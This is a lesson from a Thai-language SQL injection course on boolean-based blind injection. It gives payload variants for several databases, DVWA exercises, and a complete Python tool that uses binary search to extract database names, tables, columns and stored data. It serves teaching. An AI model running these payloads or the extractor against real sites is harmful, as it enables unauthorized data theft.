# Part 016: Boolean-Based Blind SQL Injection

## ภาพรวม

Boolean-based Blind SQL Injection ใช้เมื่อ application ไม่แสดง error messages และไม่แสดงข้อมูลจาก database โดยตรง แต่พฤติกรรมของ application เปลี่ยนตามผล true/false ของ SQL query

**ขั้นตอนที่ 171-188**

---

## 171. หลักการ Boolean-Based Blind

### 71.1 True vs False Response

```
ปกติ (id=1):
GET /item?id=1 → แสดงข้อมูล item 1

True condition (id=1 AND 1=1):
GET /item?id=1 AND 1=1 → แสดงข้อมูลเหมือนปกติ (true)

False condition (id=1 AND 1=2):
GET /item?id=1 AND 1=2 → ไม่แสดงข้อมูล (false)
```

### 71.2 ใช้ Condition เพื่อดึงข้อมูล

```sql
id=1 AND database()='admin'
id=1 AND SUBSTRING(database(),1,1)='a'
id=1 AND SUBSTRING(database(),1,1)='b'
...
```

---

## 172. เทคนิค Binary Search สำหรับ Blind SQLi

### 72.1 ทำไมต้องใช้ Binary Search?

ASCII มี 128 characters แทนที่จะเดาทีละตัว (128 ครั้ง) ใช้ binary search ลดเหลือแค่ 7-8 ครั้ง

```
ตัวอย่าง: หา ASCII code ของ char แรก

Binary search range: 0-127

Attempt 1: ASCII > 63?  → True  → range: 64-127
Attempt 2: ASCII > 95?  → True  → range: 96-127
Attempt 3: ASCII > 111? → False → range: 96-111
Attempt 4: ASCII > 103? → False → range: 96-103
Attempt 5: ASCII > 99?  → False → range: 96-99
Attempt 6: ASCII > 97?  → True  → range: 98-99
Attempt 7: ASCII > 98?  → False ← 98 = 'b'

หา 'b' ใน 7 ครั้ง แทนที่จะเดา 98 ครั้ง
```

### 72.2 SQL Payloads สำหรับ Binary Search

```sql
-- MySQL
1 AND ASCII(SUBSTRING(database(),1,1)) > 63
1 AND ASCII(SUBSTRING(database(),1,1)) > 95
...
1 AND ASCII(SUBSTRING(database(),1,1)) = 98   -- 'b'
```

---

## 173. Python Script - Binary Search Boolean Extractor

```python
#!/usr/bin/env python3
"""
Boolean-Based Blind SQL Injection Extractor
ใช้ Binary Search สำหรับความเร็ว
สำหรับการศึกษาเท่านั้น
"""

import requests
import time
from typing import Optional, Callable

class BooleanBlindExtractor:
    def __init__(self, url: str, param: str, true_condition_fn: Callable,
                 delay: float = 0.1, cookies: dict = None):
        self.url = url
        self.param = param
        self.true_condition = true_condition_fn
        self.delay = delay
        self.session = requests.Session()
        if cookies:
            self.session.cookies.update(cookies)
        self.requests_count = 0
    
    def send_payload(self, payload: str) -> bool:
        params = {self.param: payload}
        try:
            r = self.session.get(self.url, params=params, timeout=10)
            self.requests_count += 1
            time.sleep(self.delay)
            return self.true_condition(r)
        except Exception:
            return False
    
    def extract_char(self, query: str, position: int) -> Optional[str]:
        lo, hi = 32, 126
        
        while lo <= hi:
            mid = (lo + hi) // 2
            payload = f"1 AND ASCII(SUBSTRING(({query}),{position},1)) > {mid}-- -"
            
            if self.send_payload(payload):
                lo = mid + 1
            else:
                payload_eq = f"1 AND ASCII(SUBSTRING(({query}),{position},1)) = {mid}-- -"
                if self.send_payload(payload_eq):
                    return chr(mid)
                hi = mid - 1
        
        payload_null = f"1 AND ASCII(SUBSTRING(({query}),{position},1)) = 0-- -"
        if self.send_payload(payload_null):
            return None
        
        return chr(lo) if lo <= 126 else None
    
    def extract_length(self, query: str) -> int:
        lo, hi = 0, 100
        
        while lo < hi:
            mid = (lo + hi + 1) // 2
            payload = f"1 AND LENGTH(({query})) >= {mid}-- -"
            
            if self.send_payload(payload):
                lo = mid
            else:
                hi = mid - 1
        
        return lo
    
    def extract_string(self, query: str, max_length: int = 100) -> str:
        length = self.extract_length(query)
        
        if length == 0:
            return ""
        
        result = ""
        for i in range(1, length + 1):
            char = self.extract_char(query, i)
            if char is None:
                break
            result += char
            print(f"\r    Extracting: {result}{'.' * (length - i)}", end='', flush=True)
        
        print()
        return result
    
    def get_version(self) -> str:
        print("[*] Extracting database version...")
        return self.extract_string("SELECT version()")
    
    def get_database(self) -> str:
        print("[*] Extracting current database...")
        return self.extract_string("SELECT database()")
    
    def get_all_databases(self) -> list:
        count_str = self.extract_string("SELECT COUNT(*) FROM information_schema.schemata")
        count = int(count_str) if count_str.isdigit() else 0
        databases = []
        for i in range(count):
            db = self.extract_string(f"SELECT schema_name FROM information_schema.schemata LIMIT {i},1")
            if db:
                databases.append(db)
                print(f"[+] Database [{i+1}/{count}]: {db}")
        return databases
    
    def get_all_tables(self, database: str = None) -> list:
        if database:
            query = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{database}'"
        else:
            query = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()"
        
        count_str = self.extract_string(query)
        count = int(count_str) if count_str.isdigit() else 0
        tables = []
        
        print(f"[*] Extracting {count} tables...")
        for i in range(count):
            if database:
                tq = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {i},1"
            else:
                tq = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1"
            table = self.extract_string(tq)
            if table:
                tables.append(table)
                print(f"[+] Table [{i+1}/{count}]: {table}")
        return tables
    
    def get_all_columns(self, table: str, database: str = None) -> list:
        if database:
            count_q = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'"
        else:
            count_q = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}'"
        
        count_str = self.extract_string(count_q)
        count = int(count_str) if count_str.isdigit() else 0
        columns = []
        
        for i in range(count):
            if database:
                cq = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {i},1"
            else:
                cq = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {i},1"
            col = self.extract_string(cq)
            if col:
                columns.append(col)
                print(f"[+] Column [{i+1}/{count}]: {col}")
        return columns
    
    def dump_column(self, table: str, column: str, limit: int = 10) -> list:
        count_str = self.extract_string(f"SELECT COUNT(*) FROM {table}")
        count = min(int(count_str) if count_str.isdigit() else 0, limit)
        data = []
        
        for i in range(count):
            value = self.extract_string(f"SELECT {column} FROM {table} LIMIT {i},1")
            data.append(value)
            print(f"[+] {column}[{i}]: {value}")
        return data
    
    def print_stats(self):
        print(f"\n[*] Total requests made: {self.requests_count}")


if __name__ == "__main__":
    def is_true(r):
        return len(r.text) > 500
    
    extractor = BooleanBlindExtractor(
        url="http://example.com/items",
        param="id",
        true_condition_fn=is_true,
        delay=0.1
    )
    
    print("="*60)
    print("Boolean-Based Blind SQL Injection Extraction")
    print("="*60)
    
    version = extractor.get_version()
    print(f"\n[+] Version: {version}")
    
    database = extractor.get_database()
    print(f"[+] Database: {database}")
    
    tables = extractor.get_all_tables()
    print(f"\n[+] All tables: {tables}")
    
    extractor.print_stats()
```

---

## 174. Payload Variations

### 74.1 SUBSTRING Variants

```sql
-- MySQL
1 AND SUBSTRING(database(),1,1)='a'
1 AND MID(database(),1,1)='a'
1 AND SUBSTR(database(),1,1)='a'

-- MSSQL
1 AND SUBSTRING(DB_NAME(),1,1)='a'

-- Oracle
1 AND SUBSTR(user,1,1)='a'

-- PostgreSQL
1 AND SUBSTR(current_database(),1,1)='a'
```

### 74.2 ASCII/ORD Variants

```sql
-- MySQL/MSSQL/PostgreSQL
1 AND ASCII(SUBSTRING(database(),1,1)) > 64

-- MySQL alternative
1 AND ORD(SUBSTRING(database(),1,1)) > 64

-- Oracle
1 AND ASCII(SUBSTR(user,1,1)) > 64
```

---

## 175. แบบฝึกหัด

### Exercise 1: Manual Boolean Blind

1. ตั้งค่า DVWA ใน Medium security
2. ทดสอบ boolean conditions:
   ```
   1 AND 1=1
   1 AND 1=2
   1 AND 1=1-- 
   1 AND 1=2--
   ```

### Exercise 2: Manual Binary Search

1. `1 AND LENGTH(database()) = 6`
2. ดึงทีละ char ด้วย binary search
3. จดบันทึกจำนวน requests ที่ใช้

---

## สรุป

Boolean-based blind SQL Injection:

1. **เงื่อนไข** - Application ต้องมีพฤติกรรมต่างกันตาม true/false
2. **Binary Search** - ลดจำนวน requests จาก O(n) เป็น O(log n)
3. **ข้อมูลที่ดึงได้** - ทุกอย่างเหมือน union-based แต่ช้ากว่า

---

*Part 016 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
